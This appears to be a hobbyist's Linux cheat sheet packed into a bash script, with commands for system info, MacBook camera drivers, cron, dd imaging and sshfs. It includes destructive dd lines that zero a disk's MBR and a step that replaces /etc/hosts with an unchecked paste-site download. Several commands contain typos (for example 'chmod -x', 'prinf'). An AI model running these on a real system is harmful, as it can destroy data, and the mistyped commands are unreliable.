#!/bin/bash
echo '

Hello World

    1. Copy and paste one of the commands into the terminal.
Change the information to match your computer.
    2. Make this file executable.
chmod -x cli.text
    3. Edit the file to comment out this echo command.
Type "#" to front of echo on the second line.
    4. Uncomment one of the commands.
Remove #$> from front of the command.
    5. Run this files as an executable.
./cli.sh
    6. somethingcool.jpg
Type command.
    7. Profit!
'
<<COMMENT1
#######################################################################
# This is a project to learn the fun of the command line interface.   #
#######################################################################
####################################################
#            Draft  http://ix.io/yaV               #
####################################################

    ▬▬▬▬▬▬▬▬▬▬ஜ۩☆۩ஜ▬▬▬▬▬▬▬▬▬
  ☆☆command☆☆line☆☆interface☆☆
    ▬▬▬▬▬▬▬▬▬▬ஜ۩☆۩ஜ▬▬▬▬▬▬▬▬▬

███████████████
█   clicool   █
███████████████



COMMENT1
############################################################
##    Command-Line Linux
############################################################
## Compiled by sflaptop@gmail.com
###########################################################
##    Table Of Contents
###########################################################
##
#$    Information
#$    Setup
#$        ssh LAMP apache mysql php Wordpress
#$        Nextcloud
#$    Networking
#$    Use
#$        Sound
#$        Video
#$    bash info
#$        Pipes
#$       .bashrc
#$           Settings
#$           Functions
#$           Aliases
#$        More functions
#$    Framebuffer
#$    DANGER
#$    Python Stuff
#$    Extra Characters
#$    GUI Control
#$    HTML CSS Cheatsheets
#$    Unsorted
#$    vim
#$    keywords
#$
##
## ###########################################################
## ##    END Table Of Contents
## ###########################################################
##
##
##
## ##########################################################
## ##    Information
## ##########################################################
##------------------------------------------------
## Information about the computer system running
##================================================
## Computer information:
$> sudo dmidecode | grep -A4 'Base Board'
$> cat /proc/cpuinfo | egrep "model name|MHz"
$> cat /proc/cpuinfo
$> cat /proc/meminfo                                ## RAM info
$> dbus-uuidgen                                     ## Outputs machine ID
$> sudo lspci -vvnn                                 ## List devices on the pci bus
$> lsusb                                            ## List devices on the usb bus
$> sudo blkid                                       ## List harddrive uuid
$> lsblk -f                                         ## List the partitions, -f Output info about filesystems.
$> lscpu                                            ## List cpu info
$> lshw                                             ## List hardware info.
$> vmstat -s                                        ## RAM info.
$> lstopo                                           ## Draw machine architecture.
$> dmesg -T                                         ## Examine or control the kernel ring buffer -T human readable timestamp -L color
$> sudo iotop -o                                    ## Shows what files are accessing hard drive.
$> lsmod                                            ## List loaded modules.
$> lsof                                             ## List open files.
$> lsof -n                                          ## List open files.
$> pstree                                           ## Tree view of processes.
$> top                                              ## Show running processes.
$> iotop                                            ## Show i/o of data to and from harddrives.
$> initctl list                                     ## List all services.
$> set                                              ## Show all environmental variables and functions and info
$> env                                              ## List Environmental variables.
$> shopt                                            ## Shell Options, Change the setting of each shell option: help shopt
$> who -r                                           ## Current run level.
$> mount | column -t                                ## List mounted files system in columns.
$> echo $DISPLAY                                    ## Display tty in use, :0.0 is first available tty7, :1.0 second available tty8 or tty9, if remote X then :IPaddress:0
$> xdpyinfo                                         ## Info about current X server display.
$> xwininfo                                         ## Info about whatever window is click after command is run
$> du -h --max-depth=1                              ## Show size of sub-folders within the current directory
$> history                                          ## List commands which have run in terminal.
$> stat filename.typ                                ## Get information about file or directory.
$> cat /proc/loadavg                                ## Average system load.
$> cat /proc/meminfo                                ## Memory info.
$> dpkg -S boing.wav                                ## See what package a file belong to.
$> cat /proc/sys/vm/swappiness                      ## Check how much swapping data RAM to swap partition, 1-100; 1-preferRAM to 100-preferDisk
$> uname -p                                         ## 32 bits or 64 bits?
$> inxi -F                                          ## Outputs an assortment of system information# Get full from half remembered commands
$> apropos <part_remember> | less                   ## Searches through man pages.
$> apt-show-versions                                ## Show version of installed applications.
$> dpkg -l | grep '^i' | awk '{print $2}' | sort    ## Print sorted list of all installed packages (Debian)
$> systemctl status                                 ## Treeview of systemd system service.
$> mysqladmin -u root -p extended-status            ## View mysql status.
$> lpstat -p                                        ## List printers.
$> service --status-all                             ## Get the status of services.
$> systemctl -t service --state=active              ## Get the status of active services in systemd.
$> dstat                                            ## Running stats on disk and network usage.
$> e4defrag / -c                                    ## Check fragmentation of ex4.
$> sensors                                          ## Temp of sensors on motherboard.
$> ldd /usr/bin/mc                                  ## Show shared library dependencies.
$> upower -i /org/freedesktop/UPower/devices/battery_BAT0     ## Check battery health.
$> xrandr --verbose                                 ## Information on the display.
$> acpitool -e
$> lsscsi
$> glxinfo                                          ## information about the OpenGL and GLX implementations running on a given X display.
$> sudo cat /var/log/syslog                         ## Display the system log.
$> systemd-analyze blame                            ## Find out what services are most active.
$> acpi -b                                          ## Check whether laptop is running on battery or cable

##==========================================
##==========================================
## os. info. files. System files
$> cat /etc/group                                   ## Show available groups and members of groups.
$> cat /etc/fstab                                   ## Show file system table mounted at startup.
##==========================================
## os. info. System logs
$> cat /var/log/syslog                              ## Try other log files auth.log.
$> tail -n 20 /var/log/syslog                       ## Read last 20 entries in system logs.
$> watch -d tail /var/log/syslog                    ## Watch system logs.
## Show all logs in /var/log
$> find /var/log -type f -exec file {} \; | grep 'text' | cut -d' ' -f1 | sed -e's/:$//g' | grep -v '[0-9]$' | xargs tail -f
##==========================================
## os. Check the status of services
$> service --status-all
##==========================================
## packagemanager. Show installed but unused linux headers, image, or modules
$> dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d'
##==========================================
## info. os. hardware. Show drive names next to their full serial number (and disk info)
$> find /dev/disk/by-id -type l -printf "%l\t%f\n" | cut -b7- | sort
##==========================================
## info. files. List files and directories in present directory
$> tree -i -L 1
##==========================================
## info. files. Files and directories by size
$> du -sk ./* | sort -n | awk 'BEGIN{ pref[1]="K"; pref[2]="M"; pref[3]="G";} { total = total + $1; x = $1; y = 1; while( x > 1024 ) { x = (x + 1023)/1024; y++; } printf("%g%s\t%s\n",int(x*10)/10,pref[y],$2); } END { y = 1; while( total > 1024 ) { total = (total + 1023)/1024; y++; } printf("Total: %g%s\n",int(total*10)/10,pref[y]); }'
##==========================================
## hardware. os. Resource Monitoring system in one line
## DISK : disk space, MEM: memory ( mem , swap, Total) ,CPU : all information about cpu activity, LOAD : load average
$> echo "DISK:";df  -Pl | grep -v "Filesystem" | awk '{print $5,$6}' ; echo "MEM:" ; free -mto | awk '{ print $1,$2,$3,$4 }'; echo "CPU:"; top -b -d1 -n1 | grep Cpu |  awk '{print $2,$3,$4,$5,$6,$7,$8,$9}';echo "LOAD:"; cat /proc/loadavg
##==========================================
## http://danielmiessler.com/study/lsof/
## os. files. lsof is the Linux/Unix command with the most switches. It has so many it has to use both pluses and minuses.
## Show all connections with -i
$> lsof -i
## Pointing to a file shows what's interacting with that file
$> lsof /var/log/syslog
## Show what a given user has open using -u
$> lsof -u USERNAME
## You can also use the -t with -u to kill everything a user has open
$> kill -9 `lsof -t -u USERNAME`
##==========================================
## os. files. print the directory structure from the current directory in tree format.
$> tree
$> find ./ -type d | sed -e "s/[^-][^\/]*\//  |/g" -e "s/|\([^ ]\)/|-\1/"
##==========================================
## os. packagemanager. Print sorted list of all installed packages (Debian)
$> dpkg -l | grep '^i' | awk '{print $2}' | sort
##==========================================
## shell. os. List of most used commands
$> history | sed 's/sudo//g'| awk '{print $2}'|sort|uniq -c|sort -rn|head -30|awk '!max{max=$1;}{r="";i=s=100*$1/max;while(i-->0)r=r"#";printf "%50s %5d %s %s",$2,$1,r,"\n";}'
##==========================================
## os. hardware. info. filesystem. Get creation date of a file on ext2-3-4 fs
## Return the creation date of a file on ext2, 3, 4 filesystems, because stat command wont show it.
$> debugfs -R  "stat <$(stat --printf=%i filename)>" /dev/sdaX | grep crtime
##==========================================
## info. filesystem. du with colored bar graph with reversed order to put the focus in the big ones.
$> du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t*c+.5); b="\033[1;31m"; for (i=0; i<r; i++) b=b"#"; printf " %5.2f%% %s\033[0m %s\n", $1/t*100, b, $2}'|tac
##==========================================
## gui. Show gui display dimensions
$> xdpyinfo | grep dimensions
##==========================================
## Get the size of all the directories in current directory (Sorted Human Readable)
$> du -sh */
##==========================================
## Running info on network and disks
$> sudo apt-get install dstat
$> dstat
##==========================================
## Show current colors set for displaying different file types
$> eval $(echo "rs:global default;fi:normal file;di:directory;ln:symbolic link;pi:named pipe;so:socket;do:door;bd:block device;cd:character device;or:orphan symlink;mi:missing file;su:set uid;sg:set gid;tw:sticky other writable;ow:other writable;st:sticky;ex:executable;"|sed -e 's/:/="/g; s/\;/"\n/g') && { IFS=:; for i in $LS_COLORS; do echo -e "\e[${i#*=}m$( x=${i%=*}; [ "${!x}" ] && echo "${!x}" || echo "$x" )\e[m"; done; }
##==========================================
##==========================================
## ##########################################################
## ##    END Info
## ##########################################################
##
##
##
## ##########################################################
## ##    Setup
## ##########################################################
##------------------------------------------
## Setup includes many configurations best for running linux, most for Ubuntu based systems
##==========================================
## See .bashrc under bashrc heading
##==========================================
##==========================================
## Configuration files and what they do
$>  /etc/profile                         ## System wide environment variables for all users
$>  /etc/fstab                           ## Drives and their associated mount points. Edit this file to add cdroms, DOS partitions and drives at startup.
$>  /etc/rc.d/rc.local                   ## Bash script that is executed at the end of login process
$>  /etc/hostname                        ## Conatains full hostname
$>  /etc/cron.*                          ## There are 4 directories that automatically execute all scripts within the directory at intervals of hour, day, week or month
$>  /etc/hosts                           ## List of know host names and IP addresses on the machine.
$>  /etc/httpd/conf                      ## Paramters for the Apache web server
$>  /etc/apache2/apache2.conf            ## Paramters for the Apache2 web server
$>  /etc/inittab                         ## Specifies the run level that the machine should boot into
$>  /etc/resolv.conf                     ## Defines IP addresses of DNS servers
$>  /etc/smb.conf                        ## Config file for the SAMBA server. Allows file and print sharing with Microsoft clients
$>  /etc/X11/XF86Config                  ## Config file for XWindows
$>  ~/.xinitrc                           ## Defines the windows manager loaded by X
$>  /etc/modules                         ## Kernel modules loaded at boot
$>  /etc/lsb-release                     ## Distribution release information
$>  /etc/bash.bashrc                     ## System wide bashrc
$>  /etc/default/grub                    ## Configuration file, run update-grub after editing
$>  /etc/X11/                            ## Config files for XWindows
##==========================================
### Apple Macbook Air 2013
## Network controller: Broadcom Corporation BCM4360 802.11ac Wireless Network Adapter. https://askubuntu.com/questions/55868/installing-broadcom-wireless-drivers
## Can use gui driver manager
## or
$> sudo apt-get install bcmwl-kernel-source
## Could need firmware installer as well. Above is usually enough.
$> sudo apt-get install firmware-b43-installer
$> sudo apt-get install --reinstall bcmwl-kernel-source
## In some particular cases, after installing the firmware-b43-installer you need to remove the b43 module.
#> sudo modprobe -r b43
#> sudo modprobe b43
#> sudo rfkill unblock all
##----------------------------------------------
### Facetime camera
## Multimedia controller: Broadcom Corporation 720p FaceTime HD Camera
## https://forums.linuxmint.com/viewtopic.php?t=263871
## https://gist.github.com/Stono/990ea9f0b3c41606c292f00382d421bf
## https://github.com/patjak/bcwc_pcie/wiki/Get-Started#get-started-on-debian
## https://karlstoney.com/2017/02/27/facetimehd-camera-on-linux/
## Firmware extraction
## Download the driver (zip version) and extract it by following these steps:
## Clone the git repository with
$> git clone https://github.com/patjak/bcwc_pcie.git
$> git clone https://github.com/patjak/facetimehd-firmware
## Change to the firmware directory with
$> cd bcwc_pcie/firmware
## Dependencies for make are curl, xzcat and cpio
##     Under bcwc_pcie/firmware type $ make and then as root type # make install
##     Result should be like:
$> sudo make
#> Dowloading the driver, please wait...
#>Found matching hash from OS X, El Capitan 10.11.2
#> ==> Extracting firmware...
#> --> Decompressing the firmware using gzip...
#> --> Deleting temporary files...
#> --> Extracted firmware version 1.43.2
$> sudo make install
#> -->Copying firmware into '/usr/lib/firmware/facetimehd'
## Create facetimehd.ko
$> cd ..
$> sudo make
$> sudo make install
$> sudo depmod
$> sudo modprobe -r bdc_pci
## Load driver
$> sudo modprobe facetimehd
## Might need to add facetimehd.ko to /lib/modules/$(uname -r)/updates/facetimehd.ko by hand
$> sudo cp /tmp/bcwc_pcie/facetimehd.ko /lib/modules/$(uname -r)/updates/facetimehd.ko
$> sudo depmod
$> sudo modprobe facetimehd
##------------------------------------------
## script to install facetime hd firmware remove # in front of each line.
$> echo '
##!/bin/bash
#cd bcwc_pcie/firmware
#printf "Compiling firmware\n";
#make
#printf "done\n\n";
##
#printf "Installing firmware\n";
#sudo make install
#printf "done\n\n";
##
#cd ..
#printf "Compiling driver\n";
#make
#printf "done\n\n";
##
#printf "Installing driver\n";
#sudo make install
#printf "done\n\n";
##
#printf "Running depmod\n";
#sudo depmod
#printf "done\n\n";
##
#printf "Running modprobe -r bdc_pci\n";
#sudo modprobe -r bdc_pci
#printf "done\n\n";
##
#printf "Loading driver\n";
#sudo modprobe facetimehd
#printf "done\n\n";
#' > facetime_hd_firmware_install.sh
## Remove leading #
$> sed -i 's/^#//g' facetime_hd_firmware_install.sh
##------------------------------------------
## Optional can just run each time upgrade kernal
## Make script ./99-install-facetime-camera.sh, remove the single # at  cat > "/etc/modules-load.d/facetimehd.conf" << EOL
## Can add to file which runs each time you update the kernel
$> echo '
##!/bin/bash
#set -e
##
#export CONFIG_MODULE_SIG=n
#export CONFIG_MODULE_SIG_ALL=n
#export KERNELRELEASE=${1}
##
#echo "Installing FacetimeHD camera for $KERNELRELEASE"
#cd /tmp
#git clone https://github.com/patjak/bcwc_pcie.git
#cd bcwc_pcie/firmware
#make
#make install
#cd ..
#make
#make install
##rm -rf /tmp/bcwc_pcie
##
#if [ ! -d "/etc/modules-load.d" ]; then
#  mkdir -p "/etc/modules-load.d"
#fi
### Reload the module each kernel upgrade.
##cat > "/etc/modules-load.d/facetimehd.conf" << EOL
#videobuf2-core
#videobuf2_v4l2
#videobuf2-dma-sg
#facetimehd
#EOL
##
#echo "Install complete."
#' > 99-install-facetime-camera.sh
## Remove leading #
$> sed -i 's/^#//g' 99-install-facetime-camera.sh
## Run with
$> 99-install-facetime-camera.sh $(uname -r)
## Might need to add facetimehd.ko to /lib/modules/$(uname -r)/updates/facetimehd.ko by hand
$> sudo cp /tmp/bcwc_pcie/facetimehd.ko /lib/modules/$(uname -r)/updates/facetimehd.ko
$> sudo depmod
$> sudo modprobe -r bdc_pci
## Load driver
$> sudo modprobe facetimehd
##-------------------------------------
## OR
## mac pci video cam
## As at 8/3/2020 follow the instructions Here. They come in two parts, make sure you also follow the ones for your platform. They are a bit jumbled on the site so I have included them below.
## I'm running 18.04 LTS (Bionic) on a 2013 Macbook Pro. The instructions that worked for me were as follows:
$> sudo apt-get install git
$> sudo apt-get install curl xzcat cpio
$> git clone https://github.com/patjak/facetimehd-firmware.git
$> cd facetimehd-firmware
$> make
$> sudo make install
$> cd ..
$> sudo apt-get install kmod libssl-dev checkinstall
$> git clone https://github.com/patjak/bcwc_pcie.git
$> cd bcwc_pcie
$> ## Copy over the firmware from above to the firmware dir
$> make
$> sudo make install
$> sudo depmod
$> sudo modprobe -r bdc_pci
$> sudo modprobe facetimehd
$> sudo nano /etc/modules
## **add line "facetimehd", write out (ctl+o) & close**
## I had to install xz-utils instead of xzcat as the latter was not found
##==========================================
##==========================================
## tmux
$> firefox https://tmuxcheatsheet.com/
## ctrl+b then after press; % for vertical split, " for horizontal split, arrows to move curser, x to close
$> tmux
## start tmux as default, add the following lines to your ~/.bash_profile shell startup file, just above your aliases section.
$> prinf 'if command -v tmux &> /dev/null && [ -z "$TMUX" ]; then\ntmux attach -t default || tmux new -s default;\nfi' > ~/.bash_profile
## when using in tmux.conf, you have to escape % with %, i.e. write %% instead of %
## Fix problem runnung mc in tmux
$> TERM=xterm mc
## To write command on all the panes at once
$> ctrl+b :setw synchonize-panes
##==========================================
## os. hardware. Remove mbr with dd.  Fix corrupted mbr disk by zeroing it out.
$> sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1
##==========================================
## os. hardware. Make sd card image with dd can use bs=512 or bs=1M or  bs=4M
$> dd if=/dev/sdb of=~/sdcard.dd bs=4M
## Change to correct /dev/
$> dd bs=4M if=sdcard.img of=/dev/sdX conv=fsync
## Mount the image
$> mount -o loop sdimage.img /path/to/mount
## clone usb sticks with multiple partitions, notrunc - do not truncate the output file, noerror - continue after read errors
$> sudo dd if=/dev/sdb of=/dev/sdc bs=4096 conv=notrunc,noerror
##==========================================
## Drop into command line only environment
$> sudo service mdm stop
## To get back into the gui
$> sudo service mdm start
##------------------------------------------
## Systemd
## Stop gui
$> sudo systemctl stop mdm
## Start gui
$> sudo systemctl start mdm
##------------------------------------------
## Command line only login system service
## Boot to text mode.  Stop mdm service from starting automatically on systemd
## This doesnt actually 'disable' the service, it just prevents it from automatically starting.
$> sudo systemctl disable mdm
## Start gui
$> sudo systemctl start mdm
## boot to gui by default
$> sudo systemctl enable mdm
##------------------------------------------
## Drop into command line only environment lightdm
$> sudo service lightdm stop
## To get back into the gui
$> sudo service lightdm start
##------------------------------------------
## Systemd
## Stop gui
$> sudo systemctl stop lightdm
## Start gui
$> sudo systemctl start lightdm
##------------------------------------------
## os. permissions. Command line only login.
$> sudo systemctl set-default multi-user.target
## GUi login.
$> sudo systemctl set-default mgraphical.target
##------------------------------------------
## Change /etc/default/grub
$> sudo sed -i 's:quiet splash:quiet text:' /etc/default/grub
$> sudo update-grub
$> sudo reboot
## To start the gui
$> sudo service mdm start
## To drop out of the gui back to commandline.
$> sudo service mdm stop
##------------------------------------------
## Auto Login to X, reverse above
$> sudo sed -i 's:quiet text:quiet splash:' /etc/default/grub
$> sudo update-grub
$> sudo reboot
##------------------------------------------
## Boot into command line only environment
## Press at grub for edit
$> e
## Change from init 5 gui mode
$> $vt_handoff 5
## to init 3 multi user terminal mode
$> $vt_handoff 3
## Start back into gui
$> sudo init 5
##------------------------------------------
## Command line only login system service
## Boot to text mode.  Stop mdm service from starting automatically on systemd
## This doesnt actually 'disable' the service, it just prevents it from automatically starting.
$> sudo systemctl disable mdm
## Start gui
$> sudo systemctl start mdm
## boot to gui by default
$> sudo systemctl enable mdm
##==========================================
## os. services. To disable a listed service from starting at boot try:
$> sudo update-rc.d <service name> disable
##==========================================
## shell. os. Set users default shell
$> chsh -s /usr/local/bin/bash $USER
## Provide your login password. Verify that shell is changed:
$> grep ^$USER /etc/passwd
## Relogin to get new shell
##==========================================
## os. multiplex. Twin cli multiplexer with mouse windows.
## https://github.com/cosmos72/
## twin the window multiplexer is great but can not get it to work anymore the best lost program. RIP twin
##==========================================
## os. permissions. Check your groups
$> groups
$> grep $USER /etc/group
##==========================================
##==========================================
## Update ppa repository
$> sudo add-apt-repository ppa:<repository-name>
$> sudo apt-get update
##==========================================
## Remove a PPA from the source list in terminal:
## Remove the PPA from sources list where these PPAs are stored. PPAs are store in the form of PPA_Name.list. Use the following command to see all the PPAs added in your system:
$> sudo ls /etc/apt/sources.list.d
## Look for your desire PPA here and then remove the PPA using the following command:
$> sudo rm -i /etc/apt/sources.list.d/PPA_Name.list
##==========================================
## Export $PATH
$> export PATH=$PATH:/path/to/bin
$> sudo apt-get update
##==========================================
##  Replace /etc/hosts with adblocking hosts file
$> wget http://ix.io/1K6b
%> sudo cp /etc/hosts /etc/hosts.default
$> sudo cp 1K6b /etc/hosts
##==========================================
## Software to have fun in command line
$> sudo apt-get install tmux                         ## ctrl+b then after press; % for vertical split, " for horizontal split, arrows to move curser, x to close
$> sudo apt-get install gpm                          ## command line mouse; sudo /etc/init.d/gpm start
$> sudo apt-get install mc                           ## ncurses file browser editor
$> sudo apt-get install lynx-cur                     ## Web browser
$> sudo apt-get install elinks                       ## ncurses web browser,'o' OptionsManager>Document>Browsing>DocumentMetaRefresh>Change to "0"
$> sudo apt-get install wget                         ## Download files URLs from a text file one url per line -i dl.txt
$> sudo apt-get install cmus                         ## ncurses Music player :add ~/Music, 1-player, 7-help, c-pause, b-next, s-shuffle
#$> sudo apt-get install cclive                       ## Download youtube videos  cclive <URL>.  USE youtube-dl instead
$> sudo apt-get install mplayer                      ## Media Player with codecs -vo caca for ascii
$> sudo apt-get install vlc                          ## Media Player with codecs cvlc
$> sudo apt-get install caca-utils                   ## image to ascii cacaview
$> sudo apt-get install iotop                        ## Process viewer
$> sudo apt-get install curl                         ## Web data transfer
$> sudo apt-get install netcat                       ## Netcat gives nc concatenates web sockets
$> sudo apt-get install sc                           ## Spreadsheet <text, =number, =formula, =@sum(C44:C47), P file.sc, "S tblstyle=0" "T filename.cln"
$> sudo apt-get install youtube-dl                   ## Download youtube videos
$> sudo apt-get install mpv                          ## media player with youtube-dl built in
$> sudo apt-get install quvi                         ## Media Stream Downloader
$> sudo apt-get install mpg123                       ## mp3 player
$> sudo apt-get install ogg123                       ## ogg player
$> sudo apt-get install imagemagick                  ## Image manipulator
$> sudo apt-get install iotop                        ## harddrive i/o
$> sudo apt-get install fbi                          ## Framebuffer image viewer for tty login only, NO X gui running
$> sudo apt-get install fbterm                       ## Framebuffer terminal
$> sudo apt-get install w3m w3m-img                  ## Web browser with images. B back, U url, q quit,
$> sudo apt-get install flac                         ## flac codecs
$> sudo apt-get install lame                         ## mp3 codecs
$> sudo apt-get install ttf-mscorefonts-installer    ## Microsoft core fonts
$> sudo apt-get install msttcorefonts                ## fonts
$> sudo apt-get install fonts-dustin                 ## fonts
$> sudo apt-get install fonts-georgewilliams         ## fonts
$> sudo apt-get install fonts-sjfonts                ## fonts
$> sudo apt-get install fonts-larabie-deco           ## fonts
$> sudo apt-get install fonts-larabie-straight       ## fonts
$> sudo apt-get install fonts-larabie-uncommon       ## fonts
$> sudo apt-get install img2pdf                      ## converts images to pdfs
$> sudo apt-get install gif2mp4                      ## converts gif animated images to mp4 videos
$> sudo apt-get install ncmpcpp                      ## ncurses Music player
$> sudo apt-get install
$> sudo apt-get install
$> sudo apt-get install
$> sudo apt-get install
$> sudo apt-get install
$> wget -O speedtest-cli https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest_cli.py
##-----------------------------------------
## Install oneliner for a few command line tools
$> sudo apt-get install mc cmus gpm elinks imagemagick gif2mp4 img2pdf iotop caca-utils mplayer arp-scan nmap curl dstat finger surfraw w3m w3m-img at sc youtube-dl mpv vlc tmux fbi mpv fbterm build-essential hexcurse lynx-cur espeak mpg123 netcat
##==========================================
## Install ssh server
$> sudo apt-get install openssh-server openssh-sftp-server openssh-client sshfs
##-----------------------------------------
## https://www.digitalocean.com/community/tutorials/how-to-use-sshfs-to-mount-remote-file-systems-over-ssh
## Mount ssh with pem file
$> sudo apt install sshfs
$> sshfs -o IdentityFile="~/.ssh/commandlinefun.pem" $USER@13.57.229.253:/var/www /home/$USER/mnt
$> man sshfs # some options, -o port=PORT,follow_symlinks,compression=yes,allow_other,IdentityFile="~/.ssh/key.pem"
## Exp
$> sshfs -o compression=yes,allow_other,IdentityFile="~/.ssh/key.pem" $USER@xxx.xxx.xxx.xxx:/remote/path/ /local/mnt
##
$> sudo nano /etc/fstab
@> sshfs#root@xxx.xxx.xxx.xxx:/ /local/mnt
@> sshfs#$USER@xxx.xxx.xxx.xxx:/remote/path/ /local/mnt fuse auto,user,_netdev,reconnect,uid=1000,gid=1000,IdentityFile="/home/$USER/.ssh/key.pem",idmap=user,allow_other  0
##==========================================
## filesystem. web. networking. Mount folder/filesystem through SSH
## Install SSHFS from http://fuse.sourceforge.net/sshfs.html
## Will allow you to mount a folder securely over a network.
$> sshfs name@server:/path/to/folder /path/to/mount/point
##==========================================
## ?????????? working? Better to use sshfs.
## create a config file in .ssh directory.
## or cat paste
$> cat > ~/.ssh/config
$> Host myec2server
$> HostName myec2server.com (or IP Address of Server like xxx.xxx.xxx.xxx)
$> User ec2-user
$> IdentityFile ~/.ssh/MyEC2Key.pem
$> Compression yes
## save and exit
$> cntl-d
## on command line will connect to your remote amazon ec2 server without any other info.
$> ssh myec2server
## Open Nautilus. press Ctrl+L
$> ssh://myec2server
## mount your remote ec2server into your nautilus. Now you can edit remote files and you can use the remote server as another folder in your computer. That is great.
##==========================================
## text. app. ide. Install sublime-text. Sublime is a great ext editor with context highlighting and many features
$> sudo apt-get install sublime-text
##==========================================
## Install xfce gui a mid size lightish gui
$> sudo apt-get install xfce xfce-goodies
$> sudo apt-get install mint-meta-xfce
##==========================================
## Install ffmpeg
#$> sudo add-apt-repository ppa:mc3man/trusty-media
#$> sudo apt-get update
#$> sudo apt-get install ffmpeg
##==========================================
## Change caplock to another backspace;
$> setxkbmap -option caps:backspace
##==========================================
## os. date. info. Favorite nerdy, name friendly, date format %Y=year %m=month %d=day - %H=hour %M=minute %S=seconds, %F:YYYY-MM-DD, %T-HH:MM:SS, %N-NanoSeconds
$> date +"%Y%m%d-%H:%M"
$> date +"%Y%m%d-%H:%M:%S"
$> date "+%F %H:%M.%S"
$> date +%F.%T
## Take a nanosecond timestamp: YYYY-MM-DD HH:MM:SS.NNNNNNNNN
$> date "+%F %T.%N"
## UTC 24hr time.
$> LC_TIME="C.UTF-8" ; date --utc +"%Y%m%d-%H:%M"
##==========================================
## os. hardware. gpu. If you have a AMD or Nvidia graphics card and can not see/boot.
## During boot hold down the left shift key to get the GRUB boot menu to show.
## Press the 'e' key to edit the boot parameters. Add the boot parameters;
$> quite splash $vt_handoff nomodeset xforcevesa
## Then put in correct driver for you card
##==========================================
## os. packagemanager. app. Search for software to download from configured repositories
## Shows available packages
$> apt-cache search <searchterm>
## Shows package origin
$> apt-cache policy <searchterm>
##==========================================
## os. backup. Use dd to backup your harddrive mbr section.
$> dd if=/dev/hda of=/mbr.backup bs=512 count=1       ## Backs up MBR Master Boot Record
$> dd if=/mbr.backup of=/dev/hda bs=512 count=1       ## Restores MBR Master Boot Record
##==========================================
## os. logs
$> tail -f /var/log/syslog                            ## monitors messages
##==========================================
## Current color settings
$> dircolors --print-database
##==========================================
## Show current color profile of file type in color.
$> eval $(echo "rs:global default;fi:normal file;di:directory;ln:symbolic link;pi:named pipe;so:socket;do:door;bd:block device;cd:character device;or:orphan symlink;mi:missing file;su:set uid;sg:set gid;tw:sticky other writable;ow:other writable;st:sticky;ex:executable;"|sed -e 's/:/="/g; s/\;/"\n/g') && { IFS=:; for i in $LS_COLORS; do echo -e "\e[${i#*=}m$( x=${i%=*}; [ "${!x}" ] && echo "${!x}" || echo "$x" )\e[m"; done; }
##==========================================
## Change terminal prompt; 0;32 green
$> export PS1="\e[0;32m\u@\h \w> \e[m"
##==========================================
## ##########################
## ## ##    cron
## ##########################
## os. automation. Execute command periodically with cron
## ┌───────────── minute (0 - 59)
## │ ┌───────────── hour (0 - 23)
## │ │ ┌───────────── day of the month (1 - 31)
## │ │ │ ┌───────────── month (1 - 12)
## │ │ │ │ ┌───────────── day of the week (0 - 6) (Sunday to Saturday;7 is also Sunday on some systems)
## * * * * * command to execute
## 0 0 1 1 * or @yearly            Run once a year at midnight of 1 January
## 0 0 1 * * or @monthly           Run once a month at midnight of the first day of the month
## 0 0 * * 0 or @weekly            Run once a week at midnight on Sunday morning
## 0 0 * * * or @daily             Run once a day at midnight
## 0 * * * * or @hourly            Run once an hour at the beginning of the hour
##              @reboot            Run at startup
## 0 0,4,8,12,16,20 * * *          Run every 4 hr at 12a,4a,8a,12p,4p,8p
## 00 09-18 * * *                  Run every hour, on the hour, from 9 A.M. (09:00) through 6 P.M. (18:00), every day
##------------------------------------------
## Setup crontab job. Files in /var/spool/cron/crontabs do not edit directly, put on .crontab then add to cron, or use crontab -e to create crontab files on the fly
$> crontab -e
## Better. Personal crontab make a .crontab>> .crontab file in home directory and add to crontab.
## this one will run a script every 45min everyday.
$> echo "*/45 * * * * /path/script.sh" >> .crontab
## this one will run a script every 4 hrs everyday.
$> echo "0 0,4,8,12,16,20 * * * /path/script.sh" >> .crontab
## Add jobs to cron
$> crontab < .crontab
##------------------------------------------
## Example cron
## Download a satellite weather images every 4 hours every day to make a longer gif.
## !Careful it can fill up your drive after a while!
## Make a directory for the satellite images
$> mkdir -p /home/$USER/Projects/satellite/download
## Make script to download and timestamp the satellite images.
$> echo '#!/bin/bash' >  /home/$USER/Projects/satelite/satellite.sh
$> echo "wget --directory-prefix=/home/$USER/Projects/satellite/download/ http://images.intellicast.com/WxImages/SatelliteLoop/hipacsat_None_anim.gif; mv /home/$USER/Projects/satellite/download/hipacsat_None_anim.gif /home/$USER/Projects/satellite/download/hipacsat_None_anim\$(date +'%Y%m%d%H%M').gif" >>  /home/$USER/Projects/satelite/satellite.sh
## Make script to combine the gifs into one long gif then move them to a diff folder every 24hrs.
$> echo '#!/bin/bash' >  /home/$USER/Projects/satelite/satellite-24hr.sh
$> echo "convert -delay 50  -loop 0 /home/$USER/Projects/satellite/download/*.gif /home/$USER/Projects/satellite/download/satellite.gif; mv /home/$USER/Projects/satellite/download/satellite.gif /home/$USER/Projects/satellite/satellite\$(date +'%Y%m%d%H%M').gif; rm /home/$USER/Projects/satellite/download/*.gif;" >>  /home/$USER/Projects/satelite/satellite-24hr.sh
## Set permissions
$> chmod +x /home/$USER/Projects/satelite/satellite.sh
$> chmod +x /home/$USER/Projects/satelite/satellite-24hr.sh
## Put jobs in crontab
## Run every 4hr everyday
$> echo "0 0,4,8,12,16,20 * * * /home/$USER/satellite/satellite.sh" >> .crontab
## Run once a day at midnight
$> echo "0 0 * * * /home/$USER/Projects/satellite/satellite24hr.sh" >> .crontab && crontab < .crontab
##==========================================
## Try out new colors in mc, with -S skins from,
$> ls /usr/share/mc/skins
$> mc -S gotar
$> mc -S sand256
## Make gotar the default globally
$> sudo mv /usr/share/mc/skins/default.ini /usr/share/mc/skins/default-blue.ini
$> sudo cp /usr/share/mc/skins/gotar.ini /usr/share/mc/skins/default.ini
## Pick the default global mc skin. Usage; mcdefault skin-name    Expl. mcdefault gotar    To Reverse: mcdefault default-blue
